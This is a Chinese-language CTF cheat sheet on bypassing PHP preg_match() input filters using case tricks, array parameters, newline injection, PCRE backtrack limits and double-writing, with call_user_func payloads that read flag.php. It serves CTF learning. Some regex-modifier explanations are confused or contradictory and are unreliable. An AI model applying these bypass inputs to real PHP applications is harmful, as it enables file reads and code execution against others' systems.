# PHP 正则绕过速查

## 核心原理

PHP 的 `preg_match()` 函数在过滤用户输入时，常因正则表达式设计不当而被绕过。
理解正则修饰符和 PHP 类型行为是绕过的关键。

## 1. 大小写绕过

**适用条件**: 正则没有 `i`（PCRE_CASELESS）修饰符

```php
// 被过滤的正则 — 无 i 修饰符
preg_match("/n|c/m", $_GET['p']);  // 只匹配小写 n 和 c

// 绕过方式 — 用大写字母
// nss2 含有 n → 被拦截
// Nss2 含有 N → 不匹配小写 n → 绕过成功！
// Ctf 含有 C → 不匹配小写 c → 绕过成功！

// PHP 类名和函数名大小写不敏感
call_user_func('Nss2::Ctf');  // 等价于 nss2::ctf()
```

**验证方法**: 先确认正则是否带 `i` 修饰符，再决定使用大小写绕过

## 2. 数组绕过

**适用条件**: 函数只接受字符串参数，传入数组会返回 false

```php
// preg_match() 第二个参数需要字符串
// 传入数组 → 返回 false + Warning → 绕过正则检查

// URL: ?p[]=nss2&p[]=ctf
// $_GET['p'] = ['nss2', 'ctf']  (数组而非字符串)
// preg_match("/n|c/m", ['nss2', 'ctf']) → false → 绕过！

// call_user_func 接受数组作为回调
call_user_func(['nss2', 'ctf']);  // 等价于 nss2::ctf()
```

## 3. 换行符绕过

**适用条件**: 正则使用 `^...$` 锚点 + `m` 修饰符

```php
// 常见误解：m 修饰符不会让 /n/ 匹配换行符
// m 修饰符只影响 ^ 和 $ 的匹配行为（多行模式）

// 可以绕过的情况：
preg_match("/^flag$/", $input);  // m 修饰符下可用 %0aflag 绕过

// 不能绕过的情况：
preg_match("/n|c/m", $input);    // m 不影响 n 和 c 的匹配
```

## 4. PCRE 回溯限制绕过

**适用条件**: 超长字符串 + 回溯量大的正则

```php
// preg_match 默认回溯上限 1000000
// 超过则返回 false（不是 0 或 1）

// 构造超长字符串触发回溯限制
$str = str_repeat('a', 1000000);
preg_match("/.*$/", $str);  // 返回 false → 绕过
```

## 5. `%0a` 换行注入

**适用条件**: 正则使用 `^...$` 但没有 `s`（DOTALL）修饰符

```php
// 绕过 ^...$ 锚点
// 输入: "good\nmalicious"
preg_match("/^good$/", "good\nmalicious");  // 无 m 时不匹配
preg_match("/^good$/m", "good\nmalicious");  // 有 m 时匹配第一行
```

## 常见 CTF 题型模式

| 类型 | 正则示例 | 绕过方式 |
|------|----------|----------|
| 大小写过滤 | `/n\|c/m` | `Nss2::Ctf`（大小写绕过） |
| 字符串函数过滤 | `/system\|exec/` | `p[]=class&p[]=method`（数组绕过） |
| 锚点匹配 | `/^flag$/` | `flag%0a` 或 `%0aflag`（换行绕过） |
| 回溯限制 | `/.*/` | 超长字符串触发 PCRE 回溯限制 |
| 无锚点 | `/flag/` | `flflagag`（双写绕过，如做了 str_replace） |

## call_user_func 回调方式速查

```php
// 调用普通函数
call_user_func('readfile', 'flag.php');

// 调用静态方法（字符串形式）
call_user_func('Nss2::Ctf');  // 大小写绕过后

// 调用静态方法（数组形式）
call_user_func(['Nss2', 'Ctf']);  // 数组绕过后

// 调用实例方法
call_user_func([$obj, 'method']);
```

## ⚠️ 常见错误

1. **`call_user_func('readfile')` 不带参数** — 不会读取任何文件，必须传 `call_user_func('readfile', 'flag.php')`
2. **混淆 `m` 和 `i` 修饰符** — `m` 是多行模式，`i` 才是忽略大小写
3. **忽略 PHP 类型杂耍** — `preg_match` 遇到数组返回 `false`，不是 `0`
4. **猜测 flag 内容** — 必须通过工具获取真实响应，不能编造
